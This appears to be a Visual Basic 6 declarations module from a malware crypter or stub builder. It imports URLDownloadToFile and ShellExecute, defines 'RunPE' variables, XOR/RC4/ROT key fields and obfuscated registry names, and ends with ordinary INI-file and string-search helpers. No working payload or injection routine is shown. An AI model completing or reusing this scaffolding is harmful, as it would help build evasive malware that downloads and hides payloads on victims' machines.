Attribute VB_Name = "PublicDeclarations"
Public Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Public Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Public Declare Function MoveFile Lib "kernel32" Alias "MoveFileA" (ByVal lpExistingFileName As String, ByVal lpNewFileName As String) As Long
Public Declare Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long

Public IsDownload As Boolean

Public Api1 As String
Public Api2 As String

Public H_K_C_U As String
Public H_K_L_M As String
Public Reg_SZ As String

Public P_V_R As String
Public P_Q_I As String

Public sPar1 As String
Public sPar2 As String

Public StuVar1 As String
Public StuVar2 As String
Public StuVar3 As String

Public App_Path As String
Public PBValue As Long
Public KeepTime As Long
Public IniVal As String
Public Conv_IniVal As Long

Public RandomXorKey As String
Public RandomHexKey As Long
Public XorName As String
Public HexName As String
Public RotName As String
Public RotNumber As String
Public Rc4_Pass As String

Public VarT1    As String
Public VarT2    As String
Public VarT3    As String
Public VarT4    As String
Public Vart5    As String
Public VarT6    As String

Public ApiNames(20) As String

' Runpe Types
    Public rVar1 As String
    Public rVar2 As String
    Public rVar3 As String
    Public rVar4 As String
    Public rVar5 As String
    Public rVar6 As String
    Public rVar7 As String
    Public rVar8 As String
    Public rVar9 As String
    Public rVar10 As String
    Public rVar11 As String
    Public rVar12 As String
    Public rVar13 As String
    Public rVar14 As String
    Public rVar15 As String
    Public rVar16 As String
    
    Public RT1 As String
    Public RT2 As String
    Public RT3 As String
    Public RT4 As String
    Public RT5 As String
    Public RT6 As String
    Public RT7 As String
    Public RT8 As String
    Public RT9 As String
    Public RT10 As String
    Public RT11 As String
    Public RT12 As String
    Public RT13 As String
    Public RT14 As String
    Public RT15 As String
    Public RT16 As String
    Public RT17 As String
    Public RT18 As String
    Public RT19 As String
    Public RT20 As String
    Public RT21 As String
    Public RT22 As String
    Public RT23 As String
    Public RT24 As String
    Public RT25 As String
    Public RT26 As String
    Public RT27 As String
    Public RT28 As String
    Public RT29 As String
    Public RT30 As String
    Public RT31 As String
    
    Public RT32 As String
    Public RT33 As String
    Public RT34 As String
    Public RT35 As String
    Public RT36 As String
    Public RT37 As String
    Public RT38 As String
    Public RT39 As String
    Public RT40 As String
    Public RT41 As String
    Public RT42 As String
    Public RT43 As String
    Public RT44 As String
    Public RT45 As String
    Public RT46 As String
    Public RT47 As String
    Public RT48 As String
    Public RT49 As String
    Public RT50 As String
    Public RT51 As String
    Public RT52 As String
    Public RT53 As String
    Public RT54 As String
    Public RT55 As String
    Public RT56 As String
    Public RT57 As String
    Public RT58 As String
    Public RT59 As String
    Public RT60 As String
    Public RT61 As String
    Public RT62 As String
    
    Public RT63 As String
    Public RT64 As String
    Public RT65 As String
    Public RT66 As String
    Public RT67 As String
    Public RT68 As String
    Public RT69 As String
    Public RT70 As String
    Public RT71 As String
    Public RT72 As String
    Public RT73 As String
    Public RT74 As String
    Public RT75 As String
    Public RT76 As String
    Public RT77 As String
    Public RT78 As String
    Public RT79 As String
    Public RT80 As String
    Public RT81 As String
    Public RT82 As String
    Public RT83 As String
    
    Public RT84 As String
    Public RT85 As String
    Public RT86 As String
    Public RT87 As String
    Public RT88 As String
    Public RT89 As String
    Public RT90 As String
    Public RT91 As String
    Public RT92 As String
    Public RT93 As String
    Public RT94 As String
    Public RT95 As String
    Public RT96 As String
    Public RT97 As String
    Public RT98 As String
    Public RT99 As String
    Public RT100 As String
    Public RT101 As String
    Public RT102 As String
    Public RT103 As String
    Public RT104 As String
    Public RT105 As String
    Public RT106 As String
    Public RT107 As String
    Public RT108 As String
    Public RT109 As String


Public Var1 As String
Public Var2 As String
Public Var3 As String
Public Var4 As String
Public Var5 As String
Public Var6 As String
Public Var7 As String
Public Var8 As String
Public Var9 As String
Public Var10 As String
Public Var11 As String
Public Var12 As String
Public Var13 As String
Public Var14 As String
Public Var15 As String

Public eVar1 As String
Public eVar2 As String


Public Tvar1 As String
Public Tvar2 As String
Public Tvar3 As String
Public Tvar4 As String
Public Tvar5 As String
Public Tvar6 As String
Public Tvar7 As String
Public Tvar8 As String

Public Function ReadIniValue(INIpath As String, Key As String, Variable As String) As String
Dim NF As Integer
Dim Temp As String
Dim LcaseTemp As String
Dim ReadyToRead As Boolean
    
AssignVariables:
        NF = FreeFile
        ReadIniValue = ""
        Key = "[" & LCase$(Key) & "]"
        Variable = LCase$(Variable)
    
EnsureFileExists:
    Open INIpath For Binary As NF
    Close NF
    SetAttr INIpath, vbArchive
    
LoadFile:
    Open INIpath For Input As NF
    While Not EOF(NF)
    Line Input #NF, Temp
    LcaseTemp = LCase$(Temp)
    If InStr(LcaseTemp, "[") <> 0 Then ReadyToRead = False
    If LcaseTemp = Key Then ReadyToRead = True
    If InStr(LcaseTemp, "[") = 0 And ReadyToRead = True Then
        If InStr(LcaseTemp, Variable & "=") = 1 Then
            ReadIniValue = Mid$(Temp, 1 + Len(Variable & "="))
            Close NF: Exit Function
            End If
        End If
    Wend
    Close NF

End Function


Public Function WriteIniValue(INIpath As String, PutKey As String, PutVariable As String, PutValue As String)
Dim Temp As String
Dim LcaseTemp As String
Dim ReadKey As String
Dim ReadVariable As String
Dim LOKEY As Integer
Dim HIKEY As Integer
Dim KeyLen As Integer
Dim VAR As Integer
Dim VARENDOFLINE As Integer
Dim NF As Integer
Dim X As Integer

AssignVariables:
    NF = FreeFile
    ReadKey = vbCrLf & "[" & LCase$(PutKey) & "]" & Chr$(13)
    KeyLen = Len(ReadKey)
    ReadVariable = Chr$(10) & LCase$(PutVariable) & "="
        
EnsureFileExists:
    Open INIpath For Binary As NF
    Close NF
    SetAttr INIpath, vbArchive
    
LoadFile:
    Open INIpath For Input As NF
    Temp = Input$(LOF(NF), NF)
    Temp = vbCrLf & Temp & "[]"
    Close NF
    LcaseTemp = LCase$(Temp)
    
LogicMenu:
    LOKEY = InStr(LcaseTemp, ReadKey)
    If LOKEY = 0 Then GoTo AddKey:
    HIKEY = InStr(LOKEY + KeyLen, LcaseTemp, "[")
    VAR = InStr(LOKEY, LcaseTemp, ReadVariable)
    If VAR > HIKEY Or VAR < LOKEY Then GoTo AddVariable:
    GoTo RenewVariable:
    
AddKey:
        Temp = Left$(Temp, Len(Temp) - 2)
        Temp = Temp & vbCrLf & vbCrLf & "[" & PutKey & "]" & vbCrLf & PutVariable & "=" & PutValue
        GoTo TrimFinalString:
        
AddVariable:
        Temp = Left$(Temp, Len(Temp) - 2)
        Temp = Left$(Temp, LOKEY + KeyLen) & PutVariable & "=" & PutValue & vbCrLf & Mid$(Temp, LOKEY + KeyLen + 1)
        GoTo TrimFinalString:
        
RenewVariable:
        Temp = Left$(Temp, Len(Temp) - 2)
        VARENDOFLINE = InStr(VAR, Temp, Chr$(13))
        Temp = Left$(Temp, VAR) & PutVariable & "=" & PutValue & Mid$(Temp, VARENDOFLINE)
        GoTo TrimFinalString:

TrimFinalString:
        Temp = Mid$(Temp, 2)
        Do Until InStr(Temp, vbCrLf & vbCrLf & vbCrLf) = 0
        Temp = Replace(Temp, vbCrLf & vbCrLf & vbCrLf, vbCrLf & vbCrLf)
        Loop
    
        Do Until Right$(Temp, 1) > Chr$(13)
        Temp = Left$(Temp, Len(Temp) - 1)
        Loop
    
        Do Until Left$(Temp, 1) > Chr$(13)
        Temp = Mid$(Temp, 2)
        Loop
    
OutputAmendedINIFile:
        Open INIpath For Output As NF
        Print #NF, Temp
        Close NF
        

End Function


Function InstrWord(start, Text, search, compareMethod) As Long
    Dim index As Long
    Dim charcode As Integer

    InstrWord = 0
    index = start - 1
    
    Do
        index = InStr(index + 1, Text, search, compareMethod)
        If index = 0 Then Exit Function
        If index > 1 Then
            charcode = Asc(UCase$(Mid$(Text, index - 1, 1)))
        Else
            charcode = 32
        End If
            If charcode < 65 Or charcode > 90 Then
                charcode = Asc(UCase$(Mid$(Text, index + Len(search), 1)) & " ")
                    If charcode < 65 Or charcode > 90 Then
                        InstrWord = index
                        Exit Function
                    End If
            End If
    Loop

End Function

